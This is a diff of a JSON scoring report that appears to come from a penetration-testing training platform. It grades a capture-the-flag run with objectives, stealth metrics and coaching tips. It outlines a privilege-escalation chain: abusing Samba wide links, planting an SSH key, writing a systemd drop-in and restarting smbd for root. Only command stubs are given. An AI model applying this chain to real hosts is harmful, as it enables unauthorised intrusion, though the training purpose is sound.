-        "hash:8501bb8e"
+        "flag:user"
       ],
-      "proven_by_seq": 14
+      "proven_by_seq": 18
     },
     {
-      "objective": "abuse_sudo_rule",
+      "objective": "enumerate_samba_config",
       "tactic": "TA0004",
       "satisfied_by": [
-        "sudo -l"
+        "cat /etc/samba/shares.conf"
       ],
       "depends_on": [
-        "enumerate_privesc"
+        "capture_user_flag"
       ],
-      "user_satisfied_by_seq": 16,
+      "user_satisfied_by_seq": 19,
+      "status": "reached",
+      "finding_refs": [
+        "cred:a3279a1b"
+      ],
+      "proven_by_seq": null
+    },
+    {
+      "objective": "abuse_wide_links",
+      "tactic": "TA0007",
+      "satisfied_by": [
+        "ln -s"
+      ],
+      "depends_on": [
+        "enumerate_samba_config"
+      ],
+      "user_satisfied_by_seq": 20,
+      "status": "reached",
+      "finding_refs": [
+        "cred:e531e075"
+      ],
+      "proven_by_seq": null
+    },
+    {
+      "objective": "write_ssh_key_as_marcus",
+      "tactic": "TA0007",
+      "satisfied_by": [
+        "smbclient -U"
+      ],
+      "depends_on": [
+        "abuse_wide_links"
+      ],
+      "user_satisfied_by_seq": 21,
+      "status": "reached",
+      "finding_refs": [],
+      "proven_by_seq": null
+    },
+    {
+      "objective": "ssh_as_marcus",
+      "tactic": "TA0007",
+      "satisfied_by": [
+        "ssh"
+      ],
+      "depends_on": [
+        "write_ssh_key_as_marcus"
+      ],
+      "user_satisfied_by_seq": 22,
+      "status": "reached",
+      "finding_refs": [],
+      "proven_by_seq": null
+    },
+    {
+      "objective": "find_writable_systemd_dropin",
+      "tactic": "TA0004",
+      "satisfied_by": [
+        "ls -ld"
+      ],
+      "depends_on": [
+        "ssh_as_marcus"
+      ],
+      "user_satisfied_by_seq": 24,
+      "status": "proven",
+      "finding_refs": [],
+      "proven_by_seq": 29
+    },
+    {
+      "objective": "write_systemd_dropin",
+      "tactic": "TA0007",
+      "satisfied_by": [
+        "echo"
+      ],
+      "depends_on": [
+        "find_writable_systemd_dropin"
+      ],
+      "user_satisfied_by_seq": 25,
+      "status": "reached",
+      "finding_refs": [],
+      "proven_by_seq": null
+    },
+    {
+      "objective": "reload_and_restart_smbd",
+      "tactic": "TA0007",
+      "satisfied_by": [
+        "systemctl"
+      ],
+      "depends_on": [
+        "write_systemd_dropin"
+      ],
+      "user_satisfied_by_seq": 26,
       "status": "reached",
       "finding_refs": [],
       "proven_by_seq": null
@@ -587,16 +1002,15 @@
       "objective": "escalate_to_root",
       "tactic": "TA0004",
       "satisfied_by": [
-        "sudo tar",
-        "sudo"
+        "whoami"
       ],
       "depends_on": [
-        "abuse_sudo_rule"
+        "reload_and_restart_smbd"
       ],
-      "user_satisfied_by_seq": 17,
+      "user_satisfied_by_seq": 29,
       "status": "proven",
       "finding_refs": [],
-      "proven_by_seq": 17
+      "proven_by_seq": 29
     },
     {
       "objective": "capture_root_flag",
@@ -607,76 +1021,69 @@
       "depends_on": [
         "escalate_to_root"
       ],
-      "user_satisfied_by_seq": 18,
+      "user_satisfied_by_seq": 30,
       "status": "proven",
       "finding_refs": [
-        "flag:root",
-        "hash:c0c59f06"
+        "flag:root"
       ],
-      "proven_by_seq": 18
+      "proven_by_seq": 30
     }
   ],
   "metrics": {
-    "efficiency_pct": 67,
+    "efficiency_pct": 100,
     "time_waster": {
-      "productive_ms": 788500,
-      "detour_ms": 61000,
-      "stuck_ms": 320000,
+      "productive_ms": 861600,
+      "detour_ms": 0,
+      "stuck_ms": 0,
       "loop_ms": 0,
-      "t_active_ms": 1169500
+      "t_active_ms": 861600
     },
-    "stealth_score": 58,
+    "stealth_score": 86,
     "loud_moments": [
       {
-        "seq": 5,
-        "noise": 42.8
+        "seq": 1,
+        "noise": 17.2
       },
       {
-        "seq": 6,
-        "noise": 35.9
+        "seq": 2,
+        "noise": 12
       },
       {
         "seq": 3,
-        "noise": 30.9
+        "noise": 1
       }
     ],
-    "objective_coverage_pct": 90,
-    "technique_breadth": 10,
+    "objective_coverage_pct": 95,
+    "technique_breadth": 4,
     "ukc_coverage_pct": 100,
-    "ukc_progression": 94,
-    "weakness_breadth": 2,
-    "methodology_coverage_pct": 100,
+    "ukc_progression": 86,
+    "weakness_breadth": 0,
+    "methodology_coverage_pct": 50,
     "focus_discipline_pct": 100,
-    "recovery_median_ms": 169000,
-    "ghost_time_lost_ms": 1590700,
-    "ghost_human_wins": 4
+    "recovery_median_ms": null,
+    "ghost_time_lost_ms": 7953800,
+    "ghost_human_wins": 1
   },
   "coaching": {
     "skill_radar": {
       "recon": 100,
-      "web": 64,
+      "web": 50,
       "exploit": 100,
-      "privesc": 53,
-      "opsec": 58
+      "privesc": 100,
+      "opsec": 86
     },
     "next_steps": [
       {
-        "action": "Attempt **check cron jobs**",
-        "why": "You never tried it — `pspy` is the intended route, and it's a free check you skipped.",
-        "category": "PrivEsc",
-        "evidence_seq": null
-      },
-      {
-        "action": "Quiet down `hydra`",
-        "why": "Your loudest moment — a noisier footprint than the rest of the run combined. Reach for a stealthier approach here.",
-        "category": "OpSec",
-        "evidence_seq": 5
-      },
-      {
-        "action": "Trim ~1 min of detours",
-        "why": "Time spent on low-yield paths that didn't move an objective — step back to enumeration before forcing a path.",
+        "action": "Attempt **audit share permissions**",
+        "why": "You never tried it — `smbmap` is the intended route, and it's a free check you skipped.",
         "category": "Tactics",
         "evidence_seq": null
+      },
+      {
+        "action": "Quiet down `nmap`",
+        "why": "Your loudest moment — a noisier footprint than the rest of the run combined. Reach for a stealthier approach here.",
+        "category": "OpSec",
+        "evidence_seq": 1
       }
     ]
   },
@@ -687,47 +1094,73 @@
   "redaction_profile": "full",
   "findings": [
     {
-      "id": "cred:461681d7",
+      "id": "cred:ef1fc8ca",
       "kind": "cred",
-      "value": "PASSWD: /usr/bin/tar",
-      "source_seq": 11,
+      "value": "user:[scott]",
+      "source_seq": 5,
+      "tactic": "TA0006",
+      "used_by_seq": []
+    },
+    {
+      "id": "vuln:CVE-2026-4480",
+      "kind": "vuln",
+      "value": "CVE-2026-4480",
+      "source_seq": 7,
+      "tactic": "TA0001",
+      "used_by_seq": []
+    },
+    {
+      "id": "cred:b69f9bc7",
+      "kind": "cred",
+      "value": "user = svc-backup",
+      "source_seq": 15,
+      "tactic": "TA0006",
+      "used_by_seq": []
+    },
+    {
+      "id": "cred:f33c9983",
+      "kind": "cred",
+      "value": "Password: [redacted]",
+      "source_seq": 17,
       "tactic": "TA0006",
       "used_by_seq": []
     },
     {
       "id": "flag:user",
       "kind": "flag",
-      "value": "a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6",
-      "source_seq": 14,
+      "value": "[redacted-flag]",
+      "source_seq": 18,
       "proven": true,
       "used_by_seq": []
     },
     {
-      "id": "hash:8501bb8e",
-      "kind": "hash",
-      "value": "a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6",
-      "source_seq": 14,
+      "id": "cred:a3279a1b",
+      "kind": "cred",
+      "value": "user = marcus",
+      "source_seq": 19,
+      "tactic": "TA0006",
+      "used_by_seq": []
+    },
+    {
+      "id": "cred:e531e075",
+      "kind": "cred",
+      "value": "user=marcus",
+      "source_seq": 20,
+      "tactic": "TA0006",
       "used_by_seq": []
     },
     {
       "id": "flag:root",
       "kind": "flag",
-      "value": "f6e5d4c3b2a1f0e9d8c7b6a5f4e3d2c1",
-      "source_seq": 18,
+      "value": "[redacted-flag]",
+      "source_seq": 30,
       "proven": true,
-      "used_by_seq": []
-    },
-    {
-      "id": "hash:c0c59f06",
-      "kind": "hash",
-      "value": "f6e5d4c3b2a1f0e9d8c7b6a5f4e3d2c1",
-      "source_seq": 18,
       "used_by_seq": []
     }
   ],
   "ghost": {
-    "time_lost_ms": 1590700,
-    "human_wins": 4,
+    "time_lost_ms": 7953800,
+    "human_wins": 1,
     "items": [
       {
         "objective": "enumerate_services",
@@ -738,76 +1171,164 @@
         "note": "You did enumerate services before its prerequisite surfaced — ahead of the optimal line."
       },
       {
-        "objective": "enumerate_web_content",
+        "objective": "enumerate_smb_shares",
         "verdict": "on_time",
         "unlock_seq": 1,
-        "actual_seq": 2,
+        "actual_seq": 4,
         "lag_ms": 0,
-        "note": "On the optimal line for enumerate web content."
+        "note": "On the optimal line for enumerate smb shares."
       },
       {
-        "objective": "exploit_sql_injection",
-        "verdict": "ahead",
-        "unlock_seq": 11,
-        "actual_seq": 6,
+        "objective": "enumerate_domain_users",
+        "verdict": "late_pivot",
+        "unlock_seq": 1,
+        "actual_seq": 5,
+        "lag_ms": 87700,
+        "note": "Unlocked at step 1 but you acted at step 5 — the optimal line pivots here sooner."
+      },
+      {
+        "objective": "audit_share_permissions",
+        "verdict": "skipped",
+        "unlock_seq": 1,
+        "actual_seq": null,
         "lag_ms": 0,
-        "note": "You did exploit sql injection before its prerequisite surfaced — ahead of the optimal line."
+        "note": "Unlocked at step 1; never attempted — the optimal line takes it."
+      },
+      {
+        "objective": "exploit_print_injection",
+        "verdict": "on_time",
+        "unlock_seq": 5,
+        "actual_seq": 7,
+        "lag_ms": 0,
+        "note": "On the optimal line for exploit print injection."
       },
       {
         "objective": "get_foothold",
-        "verdict": "ahead",
-        "unlock_seq": 11,
+        "verdict": "on_time",
+        "unlock_seq": 5,
         "actual_seq": 8,
         "lag_ms": 0,
-        "note": "You did get foothold before its prerequisite surfaced — ahead of the optimal line."
+        "note": "On the optimal line for get foothold."
       },
       {
-        "objective": "enumerate_privesc",
-        "verdict": "off_path_win",
-        "unlock_seq": 11,
+        "objective": "orient_as_nobody",
+        "verdict": "late_pivot",
+        "unlock_seq": 5,
         "actual_seq": 11,
-        "lag_ms": 0,
-        "note": "You reached enumerate privesc via your own route — off the intended path."
+        "lag_ms": 277500,
+        "note": "Unlocked at step 5 but you acted at step 11 — the optimal line pivots here sooner."
       },
       {
-        "objective": "check_cron_jobs",
-        "verdict": "skipped",
-        "unlock_seq": 11,
-        "actual_seq": null,
-        "lag_ms": 0,
-        "note": "Unlocked at step 11; never attempted — the optimal line takes it."
+        "objective": "enumerate_target_users",
+        "verdict": "late_pivot",
+        "unlock_seq": 5,
+        "actual_seq": 13,
+        "lag_ms": 306000,
+        "note": "Unlocked at step 5 but you acted at step 13 — the optimal line pivots here sooner."
+      },
+      {
+        "objective": "discover_offsite_backup_creds",
+        "verdict": "late_pivot",
+        "unlock_seq": 5,
+        "actual_seq": 14,
+        "lag_ms": 341500,
+        "note": "Unlocked at step 5 but you acted at step 14 — the optimal line pivots here sooner."
+      },
+      {
+        "objective": "read_rclone_config",
+        "verdict": "late_pivot",
+        "unlock_seq": 5,
+        "actual_seq": 15,
+        "lag_ms": 345900,
+        "note": "Unlocked at step 5 but you acted at step 15 — the optimal line pivots here sooner."
+      },
+      {
+        "objective": "reuse_cred_as_scott",
+        "verdict": "late_pivot",
+        "unlock_seq": 5,
+        "actual_seq": 17,
+        "lag_ms": 373600,
+        "note": "Unlocked at step 5 but you acted at step 17 — the optimal line pivots here sooner."
       },
       {
         "objective": "capture_user_flag",
-        "verdict": "on_time",
-        "unlock_seq": 11,
-        "actual_seq": 14,
-        "lag_ms": 0,
-        "note": "On the optimal line for capture user flag."
+        "verdict": "late_pivot",
+        "unlock_seq": 5,
+        "actual_seq": 18,
+        "lag_ms": 464000,
+        "note": "Unlocked at step 5 but you acted at step 18 — the optimal line pivots here sooner."
       },
       {
-        "objective": "abuse_sudo_rule",
+        "objective": "enumerate_samba_config",
         "verdict": "late_pivot",
-        "unlock_seq": 11,
-        "actual_seq": 16,
-        "lag_ms": 462900,
-        "note": "Unlocked at step 11 but you acted at step 16 — the optimal line pivots here sooner."
+        "unlock_seq": 5,
+        "actual_seq": 19,
+        "lag_ms": 524900,
+        "note": "Unlocked at step 5 but you acted at step 19 — the optimal line pivots here sooner."
+      },
+      {
+        "objective": "abuse_wide_links",
+        "verdict": "late_pivot",
+        "unlock_seq": 5,
+        "actual_seq": 20,
+        "lag_ms": 555300,
+        "note": "Unlocked at step 5 but you acted at step 20 — the optimal line pivots here sooner."
+      },
+      {
+        "objective": "write_ssh_key_as_marcus",
+        "verdict": "late_pivot",
+        "unlock_seq": 5,
+        "actual_seq": 21,
+        "lag_ms": 578500,
+        "note": "Unlocked at step 5 but you acted at step 21 — the optimal line pivots here sooner."
+      },
+      {
+        "objective": "ssh_as_marcus",
+        "verdict": "late_pivot",
+        "unlock_seq": 5,
+        "actual_seq": 22,
+        "lag_ms": 606000,
+        "note": "Unlocked at step 5 but you acted at step 22 — the optimal line pivots here sooner."
+      },
+      {
+        "objective": "find_writable_systemd_dropin",
+        "verdict": "late_pivot",
+        "unlock_seq": 5,
+        "actual_seq": 24,
+        "lag_ms": 649800,
+        "note": "Unlocked at step 5 but you acted at step 24 — the optimal line pivots here sooner."
+      },
+      {
+        "objective": "write_systemd_dropin",
+        "verdict": "late_pivot",
+        "unlock_seq": 5,
+        "actual_seq": 25,
+        "lag_ms": 695400,
+        "note": "Unlocked at step 5 but you acted at step 25 — the optimal line pivots here sooner."
+      },
+      {
+        "objective": "reload_and_restart_smbd",
+        "verdict": "late_pivot",
+        "unlock_seq": 5,
+        "actual_seq": 26,
+        "lag_ms": 702300,
+        "note": "Unlocked at step 5 but you acted at step 26 — the optimal line pivots here sooner."
       },
       {
         "objective": "escalate_to_root",
         "verdict": "late_pivot",
-        "unlock_seq": 11,
-        "actual_seq": 17,
-        "lag_ms": 554700,
-        "note": "Unlocked at step 11 but you acted at step 17 — the optimal line pivots here sooner."
+        "unlock_seq": 5,
+        "actual_seq": 29,
+        "lag_ms": 719500,
+        "note": "Unlocked at step 5 but you acted at step 29 — the optimal line pivots here sooner."
       },
       {
         "objective": "capture_root_flag",
         "verdict": "late_pivot",
-        "unlock_seq": 11,
-        "actual_seq": 18,
-        "lag_ms": 573100,
-        "note": "Unlocked at step 11 but you acted at step 18 — the optimal line pivots here sooner."
+        "unlock_seq": 5,
+        "actual_seq": 30,
+        "lag_ms": 725900,
+        "note": "Unlocked at step 5 but you acted at step 30 — the optimal line pivots here sooner."
       }
     ]
   }
